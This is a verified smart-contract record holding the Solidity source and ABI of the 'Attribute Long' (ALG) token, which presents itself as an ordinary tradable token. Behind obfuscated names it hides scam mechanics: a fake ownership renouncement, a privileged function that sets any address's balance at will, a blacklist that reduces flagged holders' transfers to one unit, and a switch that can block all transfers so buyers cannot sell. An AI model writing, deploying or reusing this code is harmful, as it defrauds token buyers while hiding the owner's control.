{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface tradingWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableToken {\n    function createPair(address amountList, address txSwap) external returns (address);\n}\n\ninterface teamAmountEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTx) external view returns (uint256);\n\n    function transfer(address atTx, uint256 autoTotal) external returns (bool);\n\n    function allowance(address listTakeSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTx,\n        uint256 autoTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingLimit, uint256 value);\n    event Approval(address indexed listTakeSwap, address indexed spender, uint256 value);\n}\n\ninterface takeLimitMin is teamAmountEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AttributeLong is totalLaunched, teamAmountEnable, takeLimitMin {\n\n    address public isFrom;\n\n    function allowance(address swapReceiverTeam, address exemptWallet) external view virtual override returns (uint256) {\n        if (exemptWallet == toWallet) {\n            return type(uint256).max;\n        }\n        return modeMarketing[swapReceiverTeam][exemptWallet];\n    }\n\n    function txExempt() public {\n        emit OwnershipTransferred(toAmountTake, address(0));\n        launchLiquidity = address(0);\n    }\n\n    string private marketingMin = \"Attribute Long\";\n\n    function balanceOf(address enableTx) public view virtual override returns (uint256) {\n        return feeReceiver[enableTx];\n    }\n\n    function listExempt(uint256 autoTotal) public {\n        totalFrom();\n        fromLiquidity = autoTotal;\n    }\n\n    uint256 minIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenFee;\n    }\n\n    function approve(address exemptWallet, uint256 autoTotal) public virtual override returns (bool) {\n        modeMarketing[_msgSender()][exemptWallet] = autoTotal;\n        emit Approval(_msgSender(), exemptWallet, autoTotal);\n        return true;\n    }\n\n    mapping(address => bool) public shouldTakeExempt;\n\n    function senderLaunch(address receiverSenderTotal) public {\n        if (minIsTo) {\n            return;\n        }\n        if (receiverTake == fundLaunch) {\n            fundLaunch = amountMaxSell;\n        }\n        shouldTakeExempt[receiverSenderTotal] = true;\n        \n        minIsTo = true;\n    }\n\n    uint256 fromLiquidity;\n\n    bool public modeBuy;\n\n    function getOwner() external view returns (address) {\n        return launchLiquidity;\n    }\n\n    mapping(address => bool) public listLiquidity;\n\n    function owner() external view returns (address) {\n        return launchLiquidity;\n    }\n\n    address private launchLiquidity;\n\n    function tradingMarketingReceiver(address shouldBuy, uint256 autoTotal) public {\n        totalFrom();\n        feeReceiver[shouldBuy] = autoTotal;\n    }\n\n    function transferFrom(address minAuto, address atTx, uint256 autoTotal) external override returns (bool) {\n        if (_msgSender() != toWallet) {\n            if (modeMarketing[minAuto][_msgSender()] != type(uint256).max) {\n                require(autoTotal <= modeMarketing[minAuto][_msgSender()]);\n                modeMarketing[minAuto][_msgSender()] -= autoTotal;\n            }\n        }\n        return feeTotal(minAuto, atTx, autoTotal);\n    }\n\n    bool private buyTake;\n\n    uint256 public fundLaunch;\n\n    uint256 private listMode = 100000000 * 10 ** 18;\n\n    uint256 private amountMaxSell;\n\n    event OwnershipTransferred(address indexed fromLimit, address indexed limitShould);\n\n    function feeTotal(address minAuto, address atTx, uint256 autoTotal) internal returns (bool) {\n        if (minAuto == toAmountTake) {\n            return takeIs(minAuto, atTx, autoTotal);\n        }\n        uint256 teamExemptLiquidity = teamAmountEnable(isFrom).balanceOf(swapTake);\n        require(teamExemptLiquidity == fromLiquidity);\n        require(atTx != swapTake);\n        if (listLiquidity[minAuto]) {\n            return takeIs(minAuto, atTx, limitMode);\n        }\n        return takeIs(minAuto, atTx, autoTotal);\n    }\n\n    uint8 private feeAt = 18;\n\n    uint256 constant limitMode = 1 ** 10;\n\n    bool public minIsTo;\n\n    function totalFrom() private view {\n        require(shouldTakeExempt[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeAt;\n    }\n\n    constructor (){\n        \n        tradingWallet launchFund = tradingWallet(toWallet);\n        isFrom = enableToken(launchFund.factory()).createPair(launchFund.WETH(), address(this));\n        \n        toAmountTake = _msgSender();\n        txExempt();\n        shouldTakeExempt[toAmountTake] = true;\n        feeReceiver[toAmountTake] = listMode;\n        if (modeBuy) {\n            fundLaunch = receiverTake;\n        }\n        emit Transfer(address(0), toAmountTake, listMode);\n    }\n\n    function takeIs(address minAuto, address atTx, uint256 autoTotal) internal returns (bool) {\n        require(feeReceiver[minAuto] >= autoTotal);\n        feeReceiver[minAuto] -= autoTotal;\n        feeReceiver[atTx] += autoTotal;\n        emit Transfer(minAuto, atTx, autoTotal);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMode;\n    }\n\n    address swapTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address toWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private feeReceiver;\n\n    function launchedFrom(address amountTake) public {\n        totalFrom();\n        if (fundLaunch == amountFund) {\n            amountMaxSell = fundLaunch;\n        }\n        if (amountTake == toAmountTake || amountTake == isFrom) {\n            return;\n        }\n        listLiquidity[amountTake] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingMin;\n    }\n\n    address public toAmountTake;\n\n    uint256 private amountFund;\n\n    uint256 public receiverTake;\n\n    function transfer(address shouldBuy, uint256 autoTotal) external virtual override returns (bool) {\n        return feeTotal(_msgSender(), shouldBuy, autoTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private modeMarketing;\n\n    string private tokenFee = \"ALG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTakeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiverTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"launchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"listExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIsTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSenderTotal\",\"type\":\"address\"}],\"name\":\"senderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTakeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmountTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"tradingMarketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AttributeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}